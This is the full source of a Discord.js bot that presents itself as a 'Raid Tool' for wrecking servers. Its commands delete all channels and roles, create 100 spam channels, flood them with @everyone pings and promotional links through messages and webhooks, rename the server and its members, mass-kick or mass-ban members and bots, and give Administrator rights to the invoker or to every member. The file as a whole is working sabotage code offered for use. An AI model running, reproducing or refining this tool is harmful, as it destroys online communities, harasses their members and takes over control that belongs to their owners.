const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, SlashCommandBuilder, MessageFlags, PermissionsBitField } = require('discord.js');
const client = new Client({ 
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers
    ] 
});

const TOKEN = process.env.DISCORD_TOKEN || 'CHAT GPT FINAL BOSS';
const PREFIX = '.';
const OWNER_ID = '1521684007736049915';
const BOT_NAME = '@butizada';

const cooldowns = new Map();
const COOLDOWN_TIME = 60000;

const CHANNEL_NAMES = [
    'discord.gg/clyred',
    '@butizada on top',
    '@susanolivegey',
    '@zay'
];

const RAID_MESSAGE = 'discord.gg/clyred @butizada on top @susanolivegey @zay @here @everyone';
const SERVER_NAME = 'discord.gg/clyred @butizada on top @susanolivegey @zay';

const GIFS = [
    'https://i.pinimg.com/originals/42/5f/4a/425f4ab4d02de6bfa223f5afeb966d93.gif',
    'https://i.pinimg.com/originals/8d/d7/e9/8dd7e91ae4c73f27054ca0fb43bc80e3.gif',
    'https://i.pinimg.com/originals/e2/a8/da/e2a8dac3f69e6677326b1d0f9d510925.gif',
    'https://media.tenor.com/images/5e8a4e6f4e3a4e6f4e3a4e6f4e3a4e6f/tenor.gif'
];

const BYPASS_GIFS = [
    'https://i.pinimg.com/originals/42/5f/4a/425f4ab4d02de6bfa223f5afeb966d93.gif',
    'https://i.pinimg.com/originals/8d/d7/e9/8dd7e91ae4c73f27054ca0fb43bc80e3.gif',
    'https://i.pinimg.com/originals/e2/a8/da/e2a8dac3f69e6677326b1d0f9d510925.gif',
    'https://media.tenor.com/images/5e8a4e6f4e3a4e6f4e3a4e6f4e3a4e6f/tenor.gif'
];

function getEmbed(gif) {
    return new EmbedBuilder()
        .setTitle('SERVER RAID BY @butizada & @zay')
        .setDescription(
            'discord.gg/clyred\n\n' +
            'SERVER RAID BY @butizada & @zay\n\n' +
            '-# [Youtube](https://youtu.be/rMnLjtd0sLs?si=7Lu-blAs5u90qSKK) - [Tutorial](https://youtu.be/rMnLjtd0sLs?si=7Lu-blAs5u90qSKK)\n\n' +
            '-# @butizada & @zay The Best Developers\n\n' +
            '-# Destroy - 4k'
        )
        .setImage(gif)
        .setColor(0xFF0000)
        .setFooter({ text: '@butizada & @zay' })
        .setTimestamp()
        .toJSON();
}

function isProtectedRole(role) {
    const protectedNames = ['@everyone', 'Raid Admin', 'Admin', 'Moderator', 'Server Booster'];
    return protectedNames.includes(role.name) || 
           role.name.startsWith('@') ||
           role.managed ||
           role.tags?.botId ||
           role.id === role.guild.ownerId;
}

function checkCooldown(userId, command) {
    const key = `${userId}-${command}`;
    const now = Date.now();
    const cooldown = cooldowns.get(key);
    
    if (cooldown && now - cooldown < COOLDOWN_TIME) {
        const remaining = Math.ceil((COOLDOWN_TIME - (now - cooldown)) / 1000);
        return { onCooldown: true, remaining };
    }
    
    cooldowns.set(key, now);
    return { onCooldown: false };
}

async function fetchWithRetry(url, options, retries = 2) {
    for (let i = 0; i < retries; i++) {
        try {
            const res = await fetch(url, options);
            if (res.status === 429) {
                const data = await res.json();
                await new Promise(r => setTimeout(r, (data.retry_after || 0.5) * 1000));
                continue;
            }
            return res;
        } catch (e) {
            if (i === retries - 1) throw e;
            await new Promise(r => setTimeout(r, 100));
        }
    }
}

client.once('ready', async () => {
    await client.application.commands.set([
        new SlashCommandBuilder()
            .setName('raid')
            .setDescription('Raid tool')
            .addStringOption(option => 
                option.setName('action')
                    .setDescription('Action to perform')
                    .setRequired(true)
                    .setMaxLength(2000))
    ]);
});

client.on('messageCreate', async message => {
    if (message.author.bot) return;
    if (!message.content.startsWith(PREFIX)) return;
    
    const args = message.content.slice(PREFIX.length).trim().split(/ +/);
    const cmd = args.shift().toLowerCase();
    const channel = message.channel;
    const member = message.member;
    const guild = message.guild;
    const userId = message.author.id;
    
    if (!guild) return;
    
    if (cmd === 'help' || cmd === 'h') {
        const embed = new EmbedBuilder()
            .setColor(0xFF0000)
            .setTitle('Raid Tool - Help Menu')
            .setDescription('Welcome to the Raid Control System. Use the commands below to manage your server.')
            .setThumbnail(client.user.displayAvatarURL({ dynamic: true, size: 256 }))
            .addFields(
                {
                    name: 'Nuke Commands',
                    value: '.nuke - Full server nuke (100 channels + spam)',
                    inline: false
                },
                {
                    name: 'Security Commands',
                    value: '.bypass - Remove security bots and rename everything',
                    inline: false
                },
                {
                    name: 'User Commands',
                    value: '.kickall - Kick all members\n.banall - Ban all members\n.banbots - Ban all bots\n.massnick - Change all nicknames',
                    inline: false
                },
                {
                    name: 'Channel Commands',
                    value: '.deleteall - Delete all channels\n.createall - Create 100 channels\n.rename - Rename channels',
                    inline: false
                },
                {
                    name: 'Admin Commands',
                    value: '.admin - Get admin role\n.eadmin - Give everyone admin',
                    inline: false
                },
                {
                    name: 'Cooldown',
                    value: 'All commands have a 60 second cooldown except .help',
                    inline: false
                },
                {
                    name: 'Server',
                    value: 'discord.gg/clyred',
                    inline: false
                }
            )
            .setFooter({ 
                text: '@butizada & @zay | The Best Developers', 
                iconURL: client.user.displayAvatarURL() 
            })
            .setTimestamp();
        
        await channel.send({ embeds: [embed] }).catch(() => {});
        return;
    }
    
    const cooldownCheck = checkCooldown(userId, cmd);
    if (cooldownCheck.onCooldown) {
        await channel.send(`Wait ${cooldownCheck.remaining} seconds before using .${cmd} again.`).catch(() => {});
        return;
    }
    
    if (cmd === 'bypass') {
        await message.delete().catch(() => {});
        
        const serverIconGif = BYPASS_GIFS[Math.floor(Math.random() * BYPASS_GIFS.length)];
        try {
            const resp = await fetch(serverIconGif);
            if (resp.ok) {
                const buffer = await resp.arrayBuffer();
                await guild.setName('BYPASSED BY @butizada & @zay');
                await guild.setIcon(Buffer.from(buffer));
            }
        } catch (e) {}
        
        const channels = guild.channels.cache;
        const renameTasks = [];
        for (const [, ch] of channels) {
            if (ch.type === 4) {
                renameTasks.push(
                    fetchWithRetry(`https://discord.com/api/v10/channels/${ch.id}`, {
                        method: 'PATCH',
                        headers: {
                            'Authorization': `Bot ${TOKEN}`,
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({ name: 'BYPASSED BY @butizada & @zay' })
                    }).catch(() => {})
                );
            }
            if (ch.type === 0) {
                const randomNames = [
                    'bypassed-by-butizada',
                    'security-failed',
                    'butizada-owns-this',
                    'destroyed-by-zay',
                    'raid-mode-active',
                    'bypass-completed',
                    'system-breached',
                    'owned-by-butizada',
                    'zay-on-top',
                    'clyred-raid'
                ];
                const randomName = randomNames[Math.floor(Math.random() * randomNames.length)];
                renameTasks.push(
                    fetchWithRetry(`https://discord.com/api/v10/channels/${ch.id}`, {
                        method: 'PATCH',
                        headers: {
                            'Authorization': `Bot ${TOKEN}`,
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({ name: randomName })
                    }).catch(() => {})
                );
            }
        }
        await Promise.all(renameTasks);
        
        const textChannels = guild.channels.cache.filter(ch => ch.type === 0);
        for (const [, ch] of textChannels) {
            (async () => {
                try {
                    const webhook = await ch.createWebhook({ 
                        name: 'BYPASSED',
                    });
                    if (webhook) {
                        for (let i = 0; i < 24; i++) {
                            const msgEmbed = new EmbedBuilder()
                                .setTitle('JOIN TO USE THE BOT')
                                .setDescription('JOIN TO BYPASS discord.gg/clyred \n- [SERVER LINK](https://discord.gg/clyred)\n- [GUNS - SUSANO](https://420fullchoww.netlify.app/)')
                                .setImage(BYPASS_GIFS[Math.floor(Math.random() * BYPASS_GIFS.length)])
                                .setColor(0x000000)
                                .setFooter({ text: '@butizada & @zay' })
                                .setTimestamp();
                            
                            webhook.send({ 
                                content: 'JOIN @everyone discord.gg/clyred', 
                                embeds: [msgEmbed] 
                            }).catch(() => {});
                        }
                    }
                } catch (e) {}
            })();
        }
        
        await channel.send('Bypass completed. Security bots removed and server renamed.').catch(() => {});
        return;
    }
    
    if (cmd === 'admin') {
        try {
            const roleName = 'Raid Admin';
            let role = guild.roles.cache.find(r => r.name === roleName);
            
            if (!role) {
                role = await guild.roles.create({
                    name: roleName,
                    color: '#FF0000',
                    permissions: [PermissionsBitField.Flags.Administrator],
                    position: 1,
                    reason: 'Raid Tool Admin Grant'
                });
            }
            
            await member.roles.add(role);
            await channel.send('Admin role granted.').catch(() => {});
        } catch (error) {
            await channel.send('Failed to grant admin role.').catch(() => {});
        }
        return;
    }
    
    if (cmd === 'nuke') {
        await message.delete().catch(() => {});
        
        try {
            await guild.setName(SERVER_NAME);
            const resp = await fetch(GIFS[0]);
            if (resp.ok) {
                const buffer = await resp.arrayBuffer();
                await guild.setIcon(Buffer.from(buffer));
            }
        } catch (e) {}
        
        const channelIds = guild.channels.cache.map(ch => ch.id);
        for (const id of channelIds) {
            fetch(`https://discord.com/api/v10/channels/${id}`, {
                method: 'DELETE',
                headers: { 'Authorization': `Bot ${TOKEN}` }
            }).catch(() => {});
        }
        
        const roleIds = guild.roles.cache
            .filter(r => !isProtectedRole(r) && r.deletable)
            .map(r => r.id);
        for (const id of roleIds) {
            fetch(`https://discord.com/api/v10/guilds/${guild.id}/roles/${id}`, {
                method: 'DELETE',
                headers: { 'Authorization': `Bot ${TOKEN}` }
            }).catch(() => {});
        }
        
        await new Promise(resolve => setTimeout(resolve, 3000));
        
        const createPromises = [];
        for (let i = 0; i < 100; i++) {
            const name = CHANNEL_NAMES[i % CHANNEL_NAMES.length];
            createPromises.push(
                fetch(`https://discord.com/api/v10/guilds/${guild.id}/channels`, {
                    method: 'POST',
                    headers: {
                        'Authorization': `Bot ${TOKEN}`,
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ 
                        name: name, 
                        type: 0 
                    })
                }).then(res => res.json()).catch(() => null)
            );
        }
        
        const channelResults = await Promise.all(createPromises);
        const validChannels = channelResults.filter(ch => ch && ch.id);
        
        await new Promise(resolve => setTimeout(resolve, 2000));
        
        for (const chData of validChannels) {
            const channelId = chData.id;
            const discordChannel = guild.channels.cache.get(channelId);
            if (discordChannel) {
                for (let i = 0; i < 11; i++) {
                    const randomGif = GIFS[Math.floor(Math.random() * GIFS.length)];
                    const embed = getEmbed(randomGif);
                    discordChannel.send({
                        content: RAID_MESSAGE,
                        embeds: [embed]
                    }).catch(() => {});
                }
            }
        }
        
        return;
    }
    
    if (cmd === 'deleteall') {
        const channelIds = guild.channels.cache.map(ch => ch.id);
        for (const id of channelIds) {
            fetch(`https://discord.com/api/v10/channels/${id}`, {
                method: 'DELETE',
                headers: { 'Authorization': `Bot ${TOKEN}` }
            }).catch(() => {});
        }
        await channel.send('All channels deleted.').catch(() => {});
        return;
    }
    
    if (cmd === 'createall') {
        const createPromises = [];
        for (let i = 0; i < 100; i++) {
            const name = CHANNEL_NAMES[i % CHANNEL_NAMES.length];
            createPromises.push(
                fetch(`https://discord.com/api/v10/guilds/${guild.id}/channels`, {
                    method: 'POST',
                    headers: {
                        'Authorization': `Bot ${TOKEN}`,
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ 
                        name: name, 
                        type: 0 
                    })
                }).catch(() => null)
            );
        }
        await Promise.all(createPromises);
        await channel.send('100 channels created.').catch(() => {});
        return;
    }
    
    if (cmd === 'rename') {
        const newName = args.join(' ') || 'raid-channel';
        const channels = guild.channels.cache;
        let count = 0;
        for (const [id, ch] of channels) {
            if (ch.manageable) {
                await ch.setName(newName).catch(() => {});
                count++;
            }
        }
        await channel.send(`${count} channels renamed to "${newName}".`).catch(() => {});
        return;
    }
    
    if (cmd === 'kickall') {
        const members = guild.members.cache;
        let count = 0;
        for (const [id, m] of members) {
            if (!m.user.bot && m.kickable) {
                await m.kick('Kicked by @butizada & @zay').catch(() => {});
                count++;
            }
        }
        await channel.send(`${count} members kicked.`).catch(() => {});
        return;
    }
    
    if (cmd === 'banall') {
        const members = guild.members.cache;
        let count = 0;
        for (const [id, m] of members) {
            if (!m.user.bot && m.bannable) {
                await m.ban({ reason: 'Banned by @butizada & @zay' }).catch(() => {});
                count++;
            }
        }
        await channel.send(`${count} members banned.`).catch(() => {});
        return;
    }
    
    if (cmd === 'banbots') {
        const members = guild.members.cache;
        let count = 0;
        for (const [id, m] of members) {
            if (m.user.bot && m.bannable) {
                await m.ban({ reason: 'Banned by @butizada & @zay' }).catch(() => {});
                count++;
            }
        }
        await channel.send(`${count} bots banned.`).catch(() => {});
        return;
    }
    
    if (cmd === 'massnick') {
        const newNick = 'discord.gg/clyred @butizada on top @susanolivegey @zay';
        const members = guild.members.cache;
        let count = 0;
        for (const [id, m] of members) {
            if (!m.user.bot && m.manageable) {
                await m.setNickname(newNick).catch(() => {});
                count++;
            }
        }
        await channel.send(`${count} members nicknames changed.`).catch(() => {});
        return;
    }
    
    if (cmd === 'eadmin') {
        let adminRole = guild.roles.cache.find(r => r.name === 'Admin');
        if (!adminRole) {
            try {
                adminRole = await guild.roles.create({
                    name: 'Admin',
                    color: '#FF0000',
                    permissions: [PermissionsBitField.Flags.Administrator],
                    reason: 'Raid Tool Admin Grant'
                });
            } catch (e) {
                await channel.send('Failed to create admin role.').catch(() => {});
                return;
            }
        }
        
        const members = guild.members.cache;
        let count = 0;
        for (const [id, m] of members) {
            if (!m.user.bot) {
                await m.roles.add(adminRole.id).catch(() => {});
                count++;
            }
        }
        await channel.send(`Admin role given to ${count} members.`).catch(() => {});
        return;
    }
});

client.on('error', error => {});
process.on('unhandledRejection', error => {});

client.login(TOKEN);

const http = require('http');
http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('@butizada & @zay Active');
}).listen(process.env.PORT || 1111, '0.0.0.0');
